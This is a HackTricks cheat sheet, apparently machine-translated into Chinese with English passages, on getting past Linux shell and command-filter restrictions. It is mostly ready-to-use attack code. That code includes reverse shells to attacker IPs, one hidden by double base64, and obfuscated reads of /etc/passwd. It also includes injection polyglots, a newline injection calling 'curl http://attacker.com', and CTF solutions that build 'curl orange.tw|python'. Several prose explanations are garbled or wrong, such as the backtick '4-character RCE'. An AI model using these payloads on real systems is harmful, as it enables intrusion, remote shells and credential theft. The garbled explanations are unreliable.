# 绕过Linux限制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.io/)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 常见限制绕过

### 反向Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 简短的反向Shell

A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.

To create a short reverse shell, you can use the following command:

```bash
bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
```

Replace `attacker-ip` with the IP address of your machine and `attacker-port` with the port number you want to use for the connection.

This command uses the `/dev/tcp` feature in Bash to establish a TCP connection to the attacker's machine. The `>&` operator redirects both the standard output and standard error streams to the specified address. The `0>&1` part redirects the standard input stream to the same address, ensuring that the shell can receive commands from the attacker.

Once the connection is established, you will have a shell prompt on the target system, allowing you to execute commands remotely.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 绕过路径和禁用词

When conducting a penetration test or trying to gain unauthorized access to a system, it is common to encounter restrictions on certain paths and forbidden words. These restrictions are put in place to prevent unauthorized access and protect the system from potential vulnerabilities.

However, as a hacker, it is important to know how to bypass these restrictions and find alternative paths to achieve your goals. Here are some useful Linux commands that can help you bypass paths and forbidden words:

1. **mv** command: The `mv` command can be used to rename files and directories. By renaming a restricted file or directory to a non-restricted name, you can bypass the restriction and gain access.

2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and access the file or directory.

3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories without being case-sensitive. This can help you bypass restrictions on forbidden words that are case-sensitive.

4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-i` option, you can perform a case-insensitive search, allowing you to bypass restrictions on forbidden words that are case-sensitive.

5. **sed** command: The `sed` command can be used to perform text transformations on files. By using the `s/old/new/g` syntax, you can replace forbidden words with non-restricted words, bypassing the restriction.

By understanding and utilizing these Linux commands, you can effectively bypass paths and forbidden words, allowing you to navigate through restricted areas and gain unauthorized access to a system. However, it is important to note that hacking into systems without proper authorization is illegal and unethical. These techniques should only be used for educational purposes or with explicit permission from the system owner.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 绕过禁止空格

In some cases, when attempting to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.

#### Technique 1: Enclosing the command in quotes

One simple technique is to enclose the entire command, including the spaces, in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.

For example, instead of running the command `ls -l /etc/passwd`, which contains a space between `ls` and `-l`, you can run `"ls -l /etc/passwd"`.

#### Technique 2: Using escape characters

Another technique is to use escape characters to indicate that the space should be treated as part of the command, rather than a delimiter. The most commonly used escape character is the backslash `\`.

For example, instead of running the command `ls -l /etc/passwd`, you can run `ls\ -l\ /etc/passwd`.

#### Technique 3: Using alternative shells

If the restrictions on spaces are specific to the default shell, you can try using an alternative shell that does not have these restrictions. For example, you can use the `bash` shell instead of the default `sh` shell.

To do this, you can run the command `/bin/bash -c "ls -l /etc/passwd"`. This tells the system to execute the command using the `bash` shell, which does not have the same restrictions on spaces.

By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that bypassing restrictions may be considered unauthorized access and may be illegal. Always ensure that you have proper authorization before attempting to bypass any restrictions.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 绕过反斜杠和斜杠限制

在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些字符在执行命令时非常有用，因为它们可以用于转义特殊字符或路径。

然而，作为黑客，我们需要找到绕过这些限制的方法。以下是一些绕过反斜杠和斜杠限制的技巧：

1. 使用Unicode编码：可以使用Unicode编码来绕过限制。例如，可以使用`\u005c`来代替反斜杠（\），使用`\u002f`来代替斜杠（/）。

2. 使用Octal编码：类似地，可以使用Octal编码来绕过限制。例如，可以使用`\134`来代替反斜杠（\），使用`\57`来代替斜杠（/）。

3. 使用其他字符：如果反斜杠和斜杠被限制，可以尝试使用其他字符来代替它们。例如，可以使用`%5c`来代替反斜杠（\），使用`%2f`来代替斜杠（/）。

请记住，绕过系统限制可能是非法的，并且可能会导致严重的后果。在进行任何操作之前，请确保您具有合法的授权，并遵守适用的法律和道德准则。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过管道限制

在某些情况下，您可能会遇到受限制的Bash环境，其中禁止使用管道操作符（`|`）。然而，您仍然可以通过使用其他命令和技巧来绕过这些限制。

以下是一些绕过管道限制的方法：

1. 使用命令替代：您可以使用命令替代（`$()`）来执行命令并将其输出作为参数传递给其他命令。例如，`command1 $(command2)`将`command2`的输出作为参数传递给`command1`。

2. 使用子shell：您可以使用子shell（`()`）来创建一个新的Bash子进程，并在其中执行命令。例如，`(command1; command2)`将先执行`command1`，然后执行`command2`。

3. 使用临时文件：您可以将命令的输出写入临时文件，然后再将该文件作为参数传递给其他命令。例如，`command1 > temp.txt; command2 < temp.txt`将`command1`的输出写入`temp.txt`文件，然后将该文件作为输入传递给`command2`。

请注意，这些方法仅适用于绕过管道限制，并不一定适用于所有情况。在实际应用中，您需要根据具体情况选择合适的方法来绕过限制。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 通过十六进制编码绕过限制

Sometimes, when trying to execute certain commands or access restricted files, you may encounter restrictions imposed by the system. One way to bypass these restrictions is by using hex encoding.

有时候，在尝试执行特定命令或访问受限文件时，你可能会遇到系统强加的限制。绕过这些限制的一种方法是使用十六进制编码。

Hex encoding involves converting the characters of a command or file path into their hexadecimal representation. This can help bypass restrictions that are based on string matching or blacklisting certain characters.

十六进制编码涉及将命令或文件路径的字符转换为它们的十六进制表示。这可以帮助绕过基于字符串匹配或黑名单某些字符的限制。

To use hex encoding, you can use the `echo` command along with the `-e` option to interpret escape sequences. Here's an example:

要使用十六进制编码，你可以使用`echo`命令以及`-e`选项来解释转义序列。以下是一个示例：

```bash
$ echo -e "\x63\x61\x74 /etc/passwd"
```

In this example, the command `cat /etc/passwd` is encoded using hex representation. The `\x` prefix is used to indicate that the following characters are in hexadecimal format. When executed, the command will be interpreted as `cat /etc/passwd`, allowing you to bypass any restrictions that may be in place.

在这个示例中，命令`cat /etc/passwd`被使用十六进制表示进行编码。`\x`前缀用于指示后面的字符是十六进制格式。当执行时，该命令将被解释为`cat /etc/passwd`，从而允许你绕过可能存在的任何限制。

Keep in mind that hex encoding is not foolproof and may not work in all scenarios. It is important to understand the restrictions in place and the specific context in which you are trying to bypass them.

请记住，十六进制编码并不是百分百可靠的，在所有情况下都可能无法正常工作。重要的是要了解所施加的限制以及你试图绕过这些限制的具体上下文。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### 绕过IP限制

Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can use various techniques to bypass these IP restrictions and gain access to the target system. Here are some useful Linux commands that can help you achieve this:

#### 1. IP Spoofing

IP spoofing involves modifying the source IP address of network packets to make it appear as if they are coming from a different IP address. This can be done using the `hping3` command. Here's an example:

```bash
hping3 -a <spoofed_ip> -c 1 <target_ip>
```

Replace `<spoofed_ip>` with the IP address you want to spoof and `<target_ip>` with the IP address of the target system.

#### 2. Proxychains

Proxychains is a tool that allows you to run any program through a proxy server. This can help you bypass IP restrictions by routing your traffic through a different IP address. Here's how you can use it:

```bash
proxychains <command>
```

Replace `<command>` with the command you want to run through the proxy.

#### 3. VPN

Using a Virtual Private Network (VPN) can also help you bypass IP restrictions. A VPN creates a secure connection between your device and a remote server, allowing you to browse the internet using the server's IP address. There are various VPN clients available for Linux, such as OpenVPN and WireGuard.

#### 4. Tor

Tor is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your traffic through multiple Tor nodes, you can bypass IP restrictions and access blocked websites. To use Tor, you can install the Tor Browser or configure your system to use the Tor network.

These are just a few techniques that can be used to bypass IP restrictions during a penetration test. It's important to note that unauthorized access to systems or networks is illegal and should only be done with proper authorization and for legitimate purposes.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 基于时间的数据泄露

Time based data exfiltration is a technique used by hackers to bypass restrictions and exfiltrate data from a compromised system. This technique involves using timing delays to transmit data in a covert manner, making it difficult to detect and trace.

In a typical scenario, the hacker would first gain unauthorized access to a system and identify the data they want to exfiltrate. Instead of transmitting the data directly, they would use timing delays to encode the data into a series of time intervals between network packets or other system events.

For example, the hacker could manipulate the timing of ICMP echo requests or DNS queries to encode the data. By carefully controlling the timing delays, they can transmit the data bit by bit, effectively bypassing any network or system restrictions that may be in place.

To successfully exfiltrate the data, the hacker would also need a way to receive and decode the transmitted information on their end. This could involve setting up a covert channel or using a specific protocol to interpret the timing delays and reconstruct the original data.

Time based data exfiltration can be a challenging technique to detect and prevent, as it does not rely on traditional network communication channels. It requires advanced knowledge of network protocols and system behavior, making it a powerful tool for hackers looking to evade detection and exfiltrate sensitive information.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 从环境变量中获取字符

In some cases, you may encounter restrictions that prevent you from executing certain commands or accessing certain files. However, you may still be able to bypass these restrictions by leveraging the environment variables available to you.

在某些情况下，您可能会遇到阻止您执行某些命令或访问某些文件的限制。然而，您仍然可以通过利用可用的环境变量来绕过这些限制。

One useful technique is to extract characters from environment variables and use them to construct the desired command. This can be achieved by using the `echo` command along with command substitution.

一个有用的技巧是从环境变量中提取字符，并使用它们来构建所需的命令。可以通过使用`echo`命令和命令替换来实现这一点。

For example, let's say you want to execute the command `ls -la` but the `ls` command is restricted. You can extract the characters `l` and `a` from the `LANG` environment variable and construct the command as follows:

例如，假设您想执行命令`ls -la`，但是`ls`命令受到限制。您可以从`LANG`环境变量中提取字符`l`和`a`，并构建如下的命令：

```bash
$ echo $(echo $LANG | cut -c1)$(echo $LANG | cut -c3) -$(echo $LANG | cut -c2)
```

This command uses the `cut` command to extract the desired characters from the `LANG` environment variable and constructs the command `ls -la` by rearranging the characters.

该命令使用`cut`命令从`LANG`环境变量中提取所需的字符，并通过重新排列字符构建命令`ls -la`。

By leveraging this technique, you can bypass restrictions and execute commands using the characters available in environment variables.

通过利用这种技巧，您可以绕过限制，并使用环境变量中可用的字符执行命令。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS数据泄露

你可以使用**burpcollab**或[**pingb**](http://pingb.in)等工具。

### 内置命令

如果你无法执行外部函数，只能访问**有限的内置命令来获取RCE**，那么有一些巧妙的技巧可以帮助你。通常你**无法使用所有的**内置命令，所以你应该**了解所有的选择**来尝试绕过限制。灵感来自[**devploit**](https://twitter.com/devploit)。\
首先，检查所有的[**shell内置命令**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**。**然后，这里有一些建议：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 多语言命令注入

Polyglot command injection (多语言命令注入) 是一种利用不同语言解释器的漏洞来执行恶意命令的技术。这种攻击方法可以绕过基于特定语言的命令过滤和限制，从而使攻击者能够在目标系统上执行任意命令。

在多语言命令注入攻击中，攻击者利用目标系统上安装的多个解释器（如Bash、Python、Perl等）之间的差异来构造恶意命令。通过使用特定的语法和技巧，攻击者可以在不同的解释器中执行相同的命令，从而绕过特定解释器的限制。

为了成功执行多语言命令注入攻击，攻击者需要了解目标系统上安装的不同解释器的语法和特性。他们还需要找到可以在多个解释器中执行的命令，以便在攻击过程中选择合适的解释器。

为了防止多语言命令注入攻击，建议采取以下措施：

- 定期更新和维护系统上安装的解释器，以确保已修复已知的漏洞。
- 限制解释器的访问权限，只允许授权用户或进程执行命令。
- 验证和过滤用户输入，特别是在执行命令时。
- 使用安全编码实践，如避免使用用户提供的输入构造命令。

通过采取这些措施，可以减少多语言命令注入攻击的风险，并提高系统的安全性。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 绕过潜在的正则表达式限制

在进行渗透测试时，有时会遇到正则表达式的限制，这可能会阻碍我们的进一步操作。然而，我们可以使用一些技巧来绕过这些限制。

#### 1. 使用字符类

正则表达式中的字符类可以匹配一组字符中的任意一个。例如，如果我们想匹配数字，但是正则表达式限制了我们只能使用字母，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任意数字。

#### 2. 使用转义字符

正则表达式中的转义字符可以将特殊字符转义为普通字符。如果我们想匹配一个特殊字符，但是正则表达式限制了我们不能使用该字符，我们可以使用转义字符来绕过限制。例如，`\.`可以匹配一个点号。

#### 3. 使用重复限定符

正则表达式中的重复限定符可以指定一个模式重复出现的次数。如果我们想匹配一个模式，但是正则表达式限制了我们只能匹配一次，我们可以使用重复限定符来绕过限制。例如，`{2,}`可以匹配至少两次重复出现的模式。

#### 4. 使用反向引用

正则表达式中的反向引用可以引用之前捕获的模式。如果我们想匹配一个特定的模式，但是正则表达式限制了我们不能使用反向引用，我们可以使用其他技巧来绕过限制。

这些技巧只是绕过正则表达式限制的一些方法，具体取决于实际情况。在渗透测试过程中，我们需要灵活运用这些技巧，以便成功绕过正则表达式限制。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator是一个工具，用于绕过Bash脚本中的限制。它可以对Bash脚本进行混淆，使其难以理解和分析。Bashfuscator通过使用各种技术，如变量替换、函数重命名和代码重排，来改变脚本的结构和逻辑。这使得脚本的分析和检测变得更加困难，从而增加了攻击者执行恶意操作的成功率。

使用Bashfuscator时，可以通过以下命令来绕过Bash脚本的限制：

```bash
bashfuscator -i input_script.sh -o output_script.sh
```

其中，`input_script.sh`是要混淆的Bash脚本的输入文件，`output_script.sh`是混淆后的脚本的输出文件。

Bashfuscator还提供了其他选项，如`-r`用于启用随机化，`-s`用于指定随机种子，以及`-v`用于启用详细输出。这些选项可以根据需要进行配置，以增加混淆的复杂性和安全性。

使用Bashfuscator可以有效地绕过Bash脚本的限制，使其更难以被检测和分析。然而，需要注意的是，使用Bashfuscator进行恶意活动是非法的，并且可能会导致严重的法律后果。因此，应该始终遵守法律和道德规范，并仅在合法的情况下使用此工具。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 五个字符实现远程命令执行（RCE）

在某些情况下，我们可能会遇到受限制的环境，其中我们无法使用常规的命令执行技术。然而，我们仍然可以利用一些特殊的字符来绕过这些限制，并实现远程命令执行（RCE）。

以下是一个使用仅五个字符的方法来实现RCE的示例：

```bash
${IFS%?*}e${IFS%?*}x${IFS%?*}p${IFS%?*}r${IFS%?*}e${IFS%?*}s${IFS%?*}s${IFS%?*}i${IFS%?*}o${IFS%?*}n${IFS%?*} $CMD
```

在这个示例中，我们使用了`${IFS%?*}`这个特殊的字符序列。`${IFS}`是一个环境变量，它包含了用于分隔命令行参数的空格字符。`${IFS%?*}`则是`${IFS}`的一个变体，它会删除最后一个字符。

通过在每个字符之间插入`${IFS%?*}`，我们可以绕过限制，并将命令行参数连接在一起，从而实现远程命令执行。

请注意，`$CMD`是一个占位符，你需要将其替换为你想要执行的实际命令。

这种技术的一个优点是，它只使用了五个字符，因此在受限制的环境中非常有用。然而，它也有一些限制，例如无法在命令中使用空格字符。

在实际应用中，请确保仔细评估环境和风险，并遵循适当的法律和道德准则。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4个字符的RCE

在某些情况下，我们可能会遇到只允许使用非交互式shell的限制。这种情况下，我们需要找到一种方法来绕过这个限制并执行我们的命令。下面是一种使用只有4个字符的远程代码执行（RCE）技巧。

#### 使用反引号

在Bash中，我们可以使用反引号（`）来执行命令并将其结果返回给我们。这个特性可以帮助我们绕过限制并执行我们的命令。

```bash
`<command>`
```

例如，如果我们想执行`ls`命令，我们可以使用以下方式：

```bash
`ls`
```

这将执行`ls`命令并返回结果。

#### 示例

假设我们只能使用非交互式shell，并且我们想执行`id`命令来获取当前用户的身份信息。我们可以使用以下命令：

```bash
`id`
```

这将执行`id`命令并返回当前用户的身份信息。

请注意，这种技巧只适用于允许使用反引号的情况。在某些情况下，这种技巧可能无法使用。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 只读/Noexec/Distroless绕过

如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot和其他监狱绕过

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考资料和更多

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.io/)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
